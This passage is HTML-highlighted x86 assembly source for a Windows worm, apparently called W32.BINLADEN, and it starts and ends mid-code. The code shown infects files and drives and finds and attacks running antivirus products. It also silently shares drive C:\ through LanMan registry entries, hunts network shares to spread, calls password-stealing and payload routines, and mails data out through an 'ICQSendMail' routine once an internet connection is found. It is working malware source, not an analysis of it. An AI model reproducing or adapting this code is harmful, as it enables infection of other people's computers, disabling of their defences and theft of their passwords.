            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Auto</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@test</span><span class="sc0">

</span><span class="sc5">@@name__</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@name_</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NETSTAT.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@name_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@test_</span><span class="sc0">

</span><span class="sc5">@@name___</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@name____</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CALC.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@name____</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@test</span><span class="sc0">

</span><span class="sc5">UseIT</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B64File</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GetAVMem</span><span class="sc0">
</span><span class="sc1">;00401372</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">procB64encode</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">GetAVMem</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AVArray</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Antiviral Toolkit Pro'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Norton AntiVirus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Zone Alarm'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Freedom'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Avconsol'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'McAfee VirusScan'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Vshwin32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AVArray</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">AVArray1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EndAVDel</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AVArray1</span><span class="sc0">

            </span><span class="sc1">;  Run Anti-AntiVirus if found one active in memory</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteAntiV</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AVArray1</span><span class="sc0">

</span><span class="sc5">EndAVDel</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;  Try to infect shared windows directories &amp;</span><span class="sc0">
            </span><span class="sc1">;  Share DRIVE C:\
</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ModuloNet</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectDrive</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ThePayload</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">XpltXplorer</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPass</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">GetTcpTable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">TryWininet</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TcpBuffSize</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc5">TcpBuffSize</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTcpTable</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc5">ScanTcpTbl</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">TcpEntryOK</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ScanTcpTbl</span><span class="sc0">

</span><span class="sc5">TcpEntryOK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">InetActive</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoInternet</span><span class="sc0">

</span><span class="sc5">TryWininet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoInternet</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoInternet</span><span class="sc0">

</span><span class="sc5">InetActive</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;  0040142a</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ICQSendMail</span><span class="sc0">

</span><span class="sc5">NoInternet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MutexHandle</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetAVMem</span><span class="sc0">

</span><span class="sc5">EndOfWar</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad546</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT W32.BINLADEN'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">ModuloNet</span><span class="sc4">:</span><span class="sc0">  

   </span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">netpath</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">netpath2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">windirpath</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">sharehandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">CODESEG</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0">   </span><span class="sc5">ad323</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO NET'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ErroNet</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NetRet</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemAlloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc1">;  Share C:\
</span><span class="sc0">
   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0">   </span><span class="sc5">ad216</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING SHARE C:\ (M_NET)'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sharehandle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lanman</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Software\Microsoft\Windows\CurrentVersion\Network\LanMan\BinLaden'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lanman</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCreateKeyA</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">abortshare</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setvalue</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">402</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_DWORD</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Flags'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_BINARY</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Parm1enc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_BINARY</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Parm2enc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'C:\',0
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Path'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Remark'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_DWORD</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Type'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">setvalue</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">valueloop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;  SZ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">;  Address of value data</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;  dwType</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">         </span><span class="sc1">;  Reserved</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">;  Address of value to set</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">sharehandle</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">closeshare</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">valueloop</span><span class="sc0">

</span><span class="sc5">closeshare</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">sharehandle</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">

</span><span class="sc5">abortshare</span><span class="sc4">:</span><span class="sc0"> 

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0">   </span><span class="sc5">ad865</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING NETWORK EXPLORER (M_NET)'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemAlloc</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NetWorkExplorer</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemAlloc</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">DoNetLoop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EndModulo</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DoNetLoop</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NetHunter</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DoNetLoop</span><span class="sc0">

</span><span class="sc5">EndModulo</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemAlloc</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MemAlloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">NetRet</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0">   </span><span class="sc5">ad1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT MODULO NET'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ErroNet</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NetRet</span><span class="sc0">

</span><span class="sc5">NetHunter</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
